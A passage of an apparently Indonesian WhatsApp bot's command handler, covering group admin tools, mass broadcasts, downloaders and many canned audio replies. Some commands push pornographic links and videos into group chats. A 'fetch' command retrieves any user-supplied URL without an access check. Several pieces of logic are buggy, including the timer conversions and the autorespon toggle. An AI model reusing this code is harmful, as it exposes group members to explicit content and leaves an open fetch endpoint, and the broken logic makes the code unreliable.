       case 'online':
       case 'listonline':
       case 'here':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})                
             if (!isGroup) return reply(`Only group`)
             try {
             let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
             let online = [...Object.keys(Bambang.chats.get(ido).presences), Bambang.user.jid]
             Bambang.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: mek, contextInfo: { mentionedJid: online }})
             } catch (e) {
             reply(`${e}`)
}
             break
      case 'hidetag':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
             if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
             try {
             quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
             hideTag(from, `${quotedText}`)
             } catch {
             hideTag(from, `${q}`)
}
             break
      case 'sider':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
             if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
             if(!isGroup) return reply(mess.only.group)
             try {
             infom = await Bambang.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
             tagg = []
             teks = `*• Dibaca oleh:*\n\n`
             for(let i of infom.reads){
             teks += '@' + i.jid.split('@')[0] + '\n'
             teks += `> ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
             tagg.push(i.jid)
}
             teks += `*• Tersampaikan pada:*\n\n`
             for(let i of infom.deliveries){
             teks += '@' + i.jid.split('@')[0] + '\n'
             teks += `> ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
             tagg.push(i.jid)
}
             mentions(teks, tagg, true)
             } catch (e) {
             console.log(color(e))
             reply('Reply chat bot!')
}
             break
case 'closetime':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})	//	//(!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return
if (!isBotGroupAdmins) return
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
var nomor = mek.participant
Bambang.groupSettingChange (from, GroupSettingChange.messageSend, true);
}, timer)
break
case 'opentime':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})	//	//(!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return 
if (!isGroupAdmins) return 
if (!isBotGroupAdmins) return
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
var nomor = mek.participant
Bambang.groupSettingChange (from, GroupSettingChange.messageSend, false);
}, timer)
break


//═════════════════════════ [ OWNER MENU ] ═════════════════════════
//═════════════════════════ [ COPAS AJA ] ═════════════════════════
//═════════════════════════ [ NO API ] ═════════════════════════


				case 'bcnowm':
					Bambang.updatePresence(from, Presence.composing) 
					//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
				     if (!isOwner) return reply(mess.only.owner)
					if (args.length < 1) return reply('.......')
					anu = await Bambang.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await Bambang.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Bambang.sendMessage(_.jid, buff, image, {caption: `${body.slice(7)}`})
						}
						reply('')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `${body.slice(7)}`)
						}
						reply('*Done*')
					}
					break
				case 'bc':
					Bambang.updatePresence(from, Presence.composing)
					//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					if (args.length < 1) return reply('Teksnya?')
					anu = await Bambang.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Bambang.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Bambang.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Bambang.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Bambang.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Bambang.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Bambang.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: finv, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
							//sendMess(_.jid, `${body.slice(4)}`)
buttons = [{buttonId: `yoi`, buttonText: {displayText: 'OKEE'}, type: 1},{buttonId: `jjj`, buttonText: {displayText: 'SIPP'}, type: 1}]
const btnbc = {
    contentText: `${body.slice(4)}`,
    footerText: '*BROADCAST*',
    buttons: buttons,
    headerType: 1
}
await Bambang.sendMessage(_.jid, btnbc, MessageType.buttonsMessage, {quoted: ftrol})
						}
						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)
					}
					break
				case 'bc2':
				//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
					Bambang.updatePresence(from, Presence.composing) 
				     if (!isOwner) return reply(mess.only.owner)
					if (args.length < 1) return reply('.......')
					anu = await Bambang.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await Bambang.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Bambang.sendMessage(_.jid, buff, image, {caption: `[ BROADCAST ]\nDari : Owner\nPada : ${timi}\nBuat : All Kontak\nPesan : ${body.slice(5)}`})
						}
						reply('')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `[ BROADCAST ]\nDari : Owner\nPada : ${timi}\nBuat : All Kontak\nPesan : ${body.slice(5)}`)
						}
						reply('*Done*')
					}
					break
				case 'bcgc':
				//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
				     if (!isOwner) return reply(mess.only.owner)
					if (args.length < 1) return reply('Teksnya mana bosku >_<')
					anu = await groupMembers
					nom = mek.participant
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await Bambang.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Bambang.sendMessage(_.jid, buff, image, {caption: `*「 BC GROUP 」*\n\n☞ Dari Grup : ${groupName}\n☞ Pengirim : Owner\n☞ Pesan : ${body.slice(6)}`})
						}
						reply('*Done')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `*「 BC GROUP 」*\n\n☞ Dari Grup : ${groupName}\n☞ Pengirim : Owner\n☞ Pesan : ${body.slice(6)}`)
						}
						reply('Done')
					}
					break
				case 'bcgc2':
				//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
				     if (!isOwner) return reply(mess.only.owner)
					if (args.length < 1) return reply('Teksnya mana bosku >_<')
					anu = await groupMembers
					nom = mek.participant
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await Bambang.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							Bambang.sendMessage(_.jid, buff, image, {caption: `${body.slice(7)}`})
						}
						reply('Done')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `${body.slice(7)}`)
						}
						reply('Done')
					}
					break
      case 'addcmd': 
       case 'setcmd':
       //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
              if (!isOwner) return reply(`Kamu bukan user premium, kirim perintah *${prefix}buypremium* untuk membeli premium`)
              if (isQuotedSticker) {
              if (!q) return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
              var kodenya = mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
              addCmd(kodenya, q)
              textImg("Done!")
              } else {
              reply('tag stickenya')
}
              break
case 'randombokep':
              bokep = body.slice(13)
              const bo =['https://www.mediafire.com/download/8hnhjcf3pseubgy','https://www.mediafire.com/download/cty9phda3d1s62u','https://www.mediafire.com/download/8hnhjcf3pseubgy']
              const kep = bo[Math.floor(Math.random() * bo.length)]
              Bambang.sendMessage(from, '*PERMINTAAN: RANDOM BOKEP*\n*DOSA TANGGUNG PRIBADI*\n*NI BRO FREE BUAT KAMU DOWNLOAD SENDIRI, JANGAN MANJA NGENTOD!!*\n*DOSA GW UDAH BANYAK JANGAN DITAMBAHIN LAGI NGOKHEI:) :* '+ kep, text, { quoted: ftrol, caption: `NI BOKEP SAYA DAPAT DARI *©Bambang* DOSA TANGGUNG SENDIRI🗿`})
              break
               case 'hentai':
                 
                 reply(mess.wait)
                buffer = await getBuffer(`https://api.dhamzxploit.my.id/api/nsfw/waifu`)
                const bpa = await Bambang.prepareMessage(from, buffer, MessageType.image)

            const buttnsn = [{buttonId:`${prefix + command}`,buttonText: {displayText: 'Next️'}, type: 1}]

            const ButonMesasges = {

            contentText: `_© By Bambang Tri Raharjo_`,

            buttons: buttnsn,

            footerText: `Klik Next Untuk Melanjutkan`,

            headerType: 4,

            imageMessage: bpa.message.imageMessage

            }

            await Bambang.sendMessage(from, ButonMesasges, MessageType.buttonsMessage, {quoted : mek})
                break
case 'bokep':
                if (args.length < 1) return reply('*Hayolo belom tobat🤣* *tobat bodoh dosa elu udah banyak itu*')
case 'bokep2':
try{
if(!isGroup)return reply('Di group aja ngentod!! Biar dosanya kesebar..')
reply(mess.wait)
boks = Date.now();
bok = await scrapper.pornvid()
bokt = `BOKEP

┬╗ Judul    : ${bok.hasil.title}
┬╗ Upload   : ${bok.hasil.upload}
┬╗ Views    : ${bok.hasil.views}
┬╗ Like     : ${bok.hasil.like}
┬╗ Dislike  : ${bok.hasil.dislike}
┬╗ Favorite : ${bok.hasil.favorite}
┬╗ Tag      : ${bok.hasil.tags}
┬╗ Source   : ${bok.hasil.source}`

sendMediaURL(from, "https://tikporntok.com/"+bok.hasil.thumb, bokt)
sendMediaURL(from, "https://tikporntok.com/"+bok.hasil.video, monospace(`Process ${((Date.now()-boks)/1000).toFixed(1)} Seconds`))
} catch (e){
console.log(e)
reply(e)
}
break
                 case 'sarange':
const home = fs.readFileSync('./mp3/Sarange.mp3')
Bambang .sendMessage(from, home, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break  
case 'susu':
const su = fs.readFileSync('./mp3/susu.mp3')
Bambang .sendMessage(from, su, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'beb':
const beb = fs.readFileSync('./mp3/syg.mp3')
Bambang .sendMessage(from, beb, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'tutuptime':
		//(!isRegistered) return reply(`daftar dlu om ketik .verify`)
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
var nomor = mek.participant
Bambang.groupSettingChange (from, GroupSettingChange.messageSend, true);
}, timer)
break
case 'bukatime':
		//(!isRegistered) return reply(`daftar dlu om ketik .verify`)
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
var nomor = mek.participant
Bambang.groupSettingChange (from, GroupSettingChange.messageSend, false);
}, timer)
break
 case 'get':
case 'fetch':
if(!q) return reply('Linknya?')
            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            reply(bu)
            })   
            break
            case 'igdl':
case 'instagram':
if (!q) return reply('Linknya?')
var { igDownloader } = require('../mess/igdown')
   res = await igDownloader(`${q}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from,`${res.result.link}`,`${res.result.desc}`)
                    break
                    case 'tiktok':
                   case 'tiktokdl':
                   case 'tiktoknowm':
if (!q) return reply('Linknya?')
var { TiktokDownloader } = require('../mess/tiktokdl')
reply(mess.wait)
res = await TiktokDownloader(`${q}`).catch(e => {
reply(mess.error.api)
})
console.log(res)
sendMediaURL(from, `${res.result.nowatermark}`)
break
case 'leavetime':
if (!isGroup) return reply(mess.only.group)
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
Bambang.groupLeave(from);
}, timer)
break
case 'baka':
const baka = fs.readFileSync('./mp3/baka.mp3')
Bambang .sendMessage(from, baka, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'araara':
const prii = fs.readFileSync('./mp3/AraAra.mp3')
Bambang.sendMessage(from, prii, MessageType.audio, {quoted:mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sowell':
const well = fs.readFileSync('./mp3/sowell.mp3')
Bambang .sendMessage(from, well, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
            case 'autorespon':
      if (!isOwner && !mek.key.fromMe) return sticOwner(from)
           if (q === 'on'){
              autorespon = false
                    reply(`Berhasil mengaktifkan autorespon`)
                } else if (c === 'off'){
                    autorespon = true
                    reply(`Berhasil menonaktifkan autorespon`)
                } else if (!q) {
                    anu =`Silahkan pilih salah satu\n\non: untuk mengaktifkan\noff: untuk menonaktifkan`
const buttons = [{buttonId: 'autorespon on', buttonText: {displayText: 'ON✔️'}, type: 1},{buttonId: 'autorespon off', buttonText: {displayText: 'OFF✖️'}, type: 1}]
const btnharam = {
    contentText: `${anu}`,
    footerText: '*_© Bambang Tri R_*',
    buttons: buttons,
    headerType: 1
}
await Bambang.sendMessage(from, btnharam, MessageType.buttonsMessage, {quoted: ftrol})
                }
                break
case 'tilawah':
const tilawah = fs.readFileSync('./mp3/tilawah.mp3')
Bambang.sendMessage(from, tilawah, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'sholawat':
const nabi = fs.readFileSync('./mp3/sholawatnabi.mp3')
Bambang.sendMessage(from, nabi, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'ngaji':
const ngaji1 = fs.readFileSync('./mp3/ngaji.mp3')
Bambang.sendMessage(from, ngaji1, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'ngaji2':
const ngaji2 = fs.readFileSync('./mp3/ngaji2.mp3')
Bambang.sendMessage(from, ngaji2, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'iri':
const irimp3 = fs.readFileSync('./mp3/iri.mp3');
Bambang.sendMessage(from, irimp3, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'pale':
const pa = fs.readFileSync('./mp3/pale.mp3')
Bambang.sendMessage(from, pa, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'hallo':
const hallo = fs.readFileSync('./mp3/hallo.mp3')
Bambang.sendMessage(from, hallo, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'magic':
const magic = fs.readFileSync('mp3/magic.mp3')
Bambang.sendMessage(from, magic, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'menyukaiku':
const menyukaiku = fs.readFileSync('mp3/menyukaiku.mp3')
Bambang.sendMessage(from, menyukaiku, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound':
const soun = fs.readFileSync('./mp3/sound.mp3')
Bambang.sendMessage(from, soun, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'sound1':
satu = fs.readFileSync('./mp3/sound1.mp3');
Bambang.sendMessage(from, satu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound2':
dua = fs.readFileSync('./mp3/sound2.mp3');
Bambang.sendMessage(from, dua, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound3':
tiga = fs.readFileSync('./mp3/sound3.mp3');
Bambang.sendMessage(from, tiga, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound4':
empat = fs.readFileSync('./mp3/sound4.mp3');
Bambang.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound5':
lima = fs.readFileSync('./mp3/sound5.mp3');
Bambang.sendMessage(from, lima, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound6':
enam = fs.readFileSync('./mp3/sound6.mp3');
Bambang.sendMessage(from, enam, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound7':
tujuh = fs.readFileSync('./mp3/sound7.mp3');
Bambang.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break									
case 'sound8':
delapan = fs.readFileSync('./mp3/sound8.mp3');
Bambang.sendMessage(from, delapan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound9':
sembilan = fs.readFileSync('./mp3/sound9.mp3');
Bambang.sendMessage(from, sembilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound10':
sepuluh = fs.readFileSync('./mp3/sound10.mp3');
Bambang.sendMessage(from, sepuluh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound11':
sebelas = fs.readFileSync('./mp3/sound11.mp3');
Bambang.sendMessage(from, sebelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound12':
duabelas = fs.readFileSync('./mp3/sound12.mp3');
Bambang.sendMessage(from, duabelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound13':
tigabelas = fs.readFileSync('./mp3/sound13.mp3');
Bambang.sendMessage(from, tigabelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound14':
empatbelas = fs.readFileSync('./mp3/sound14.mp3');
Bambang.sendMessage(from, empatbelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound15':
limabelas = fs.readFileSync('./mp3/sound15.mp3');
Bambang.sendMessage(from, limabelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound16':
enambelas = fs.readFileSync('./mp3/sound16.mp3');
Bambang.sendMessage(from, enambelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound17':
tujuhbelas = fs.readFileSync('./mp3/sound17.mp3');
Bambang.sendMessage(from, tujuhbelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound18':
delapanbelas = fs.readFileSync('./mp3/sound18.mp3');
Bambang.sendMessage(from, delapanbelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound19':
sembilanbelas = fs.readFileSync('./mp3/sound19.mp3');
Bambang.sendMessage(from, sembilanbelas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound20':
duapuluh = fs.readFileSync('./mp3/sound20.mp3');
Bambang.sendMessage(from, duapuluh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound21':
duasatu = fs.readFileSync('./mp3/sound21.mp3');
Bambang.sendMessage(from, duasatu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound22':
duadua = fs.readFileSync('./mp3/sound22.mp3');
Bambang.sendMessage(from, duadua, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound23':
duatiga = fs.readFileSync('./mp3/sound23.mp3');
Bambang.sendMessage(from, duatiga, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound24':
duaempat = fs.readFileSync('./mp3/sound24.mp3');
Bambang.sendMessage(from, duaempat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound25':
dualima = fs.readFileSync('./mp3/sound25.mp3');
Bambang.sendMessage(from, dualima, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound26':
duaenam = fs.readFileSync('./mp3/sound26.mp3');
Bambang.sendMessage(from, duaenam, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound27':
duatujuh = fs.readFileSync('./mp3/sound27.mp3');
Bambang.sendMessage(from, duatujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound28':
duadelapan = fs.readFileSync('./mp3/sound28.mp3');
Bambang.sendMessage(from, duadelapan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound29':
duasembilan = fs.readFileSync('./mp3/sound29.mp3');
Bambang.sendMessage(from, duasembilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound30':
tigapuluh = fs.readFileSync('./mp3/sound30.mp3');
Bambang.sendMessage(from, tigapuluh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound31':
tigasatu = fs.readFileSync('./mp3/sound31.mp3');
Bambang.sendMessage(from, tigasatu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound32':
tigadua = fs.readFileSync('./mp3/sound32.mp3');
Bambang.sendMessage(from, tigadua, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound33':
tigatiga = fs.readFileSync('./mp3/sound33.mp3');
Bambang.sendMessage(from, tigatiga, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound34':
tigaempat = fs.readFileSync('./mp3/sound34.mp3');
Bambang.sendMessage(from, tigaempat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound35':
tigalima = fs.readFileSync('./mp3/sound35.mp3');
Bambang.sendMessage(from, tigalima, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound35':
tigalima = fs.readFileSync('./mp3/sound35.mp3');
Bambang.sendMessage(from, tigalima, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound36':
tigaenam = fs.readFileSync('./mp3/sound36.mp3');
Bambang.sendMessage(from, tigaenam, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound37':
tigatujuh = fs.readFileSync('./mp3/sound37.mp3');
Bambang.sendMessage(from, tigatujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound38':
tigadelapan = fs.readFileSync('./mp3/sound38.mp3');
Bambang.sendMessage(from, tigadelapan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound39':
tigasembilan = fs.readFileSync('./mp3/sound39.mp3');
Bambang.sendMessage(from, tigasembilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound40':
empatpuluh = fs.readFileSync('./mp3/sound40.mp3');
Bambang.sendMessage(from, empatpuluh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound41':
empatsatu = fs.readFileSync('./mp3/sound41.mp3');
Bambang.sendMessage(from, empatsatu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound42':
empatdua = fs.readFileSync('./mp3/sound42.mp3');
Bambang.sendMessage(from, empatdua, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound43':
empattiga = fs.readFileSync('./mp3/sound43.mp3');
Bambang.sendMessage(from, empattiga, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound44':
empatempat = fs.readFileSync('./mp3/sound44.mp3');
Bambang.sendMessage(from, empatempat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound45':
empatlima = fs.readFileSync('./mp3/sound45.mp3');
Bambang.sendMessage(from, empatlima, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound46':
empatenam = fs.readFileSync('./mp3/sound46.mp3');
Bambang.sendMessage(from, empatenam, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound47':
empattujuh = fs.readFileSync('./mp3/sound47.mp3');
Bambang.sendMessage(from, empattujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound48':
empatdelapan = fs.readFileSync('./mp3/sound48.mp3');
Bambang.sendMessage(from, empatdelapan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound49':
empatsembilan = fs.readFileSync('./mp3/sound49.mp3');
Bambang.sendMessage(from, empatsembilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound50':
limapuluh = fs.readFileSync('./mp3/sound50.mp3');
Bambang.sendMessage(from, limapuluh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound51':
limasatu = fs.readFileSync('./mp3/Kecewa.mp3');
Bambang.sendMessage(from, limasatu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound52':
limadua = fs.readFileSync('./mp3/Jarak.mp3');
Bambang.sendMessage(from, limadua, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound53':
limatiga = fs.readFileSync('./mp3/Bisa.mp3');
Bambang.sendMessage(from, limatiga, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound54':
limaempat = fs.readFileSync('./mp3/Disini.mp3');
Bambang.sendMessage(from, limaempat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound55':
limalima = fs.readFileSync('./mp3/Batu.mp3');
Bambang.sendMessage(from, limalima, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'desah':
delapansatu = fs.readFileSync('./mp3/desahan4.mp3');
Bambang.sendMessage(from, delapansatu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound56':
limaenam = fs.readFileSync('./mp3/Adanya.mp3');
Bambang.sendMessage(from, limaenam, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound57':
limatujuh = fs.readFileSync('./mp3/Pelangi.mp3');
Bambang.sendMessage(from, limatujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound58':
limadelapan = fs.readFileSync('./mp3/sound58.mp3');
Bambang.sendMessage(from, limadelapan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound59':
limasembilan = fs.readFileSync('./mp3/sound59.mp3');
Bambang.sendMessage(from, limasembilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound60':
enampuluh = fs.readFileSync('./mp3/sound60.mp3');
Bambang.sendMessage(from, enampuluh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound61':
enamsatu = fs.readFileSync('./mp3/sound61.mp3');
Bambang.sendMessage(from, enamsatu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound62':
enamdua = fs.readFileSync('./mp3/Sasageyo.mp3');
Bambang.sendMessage(from, enamdua, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound63':
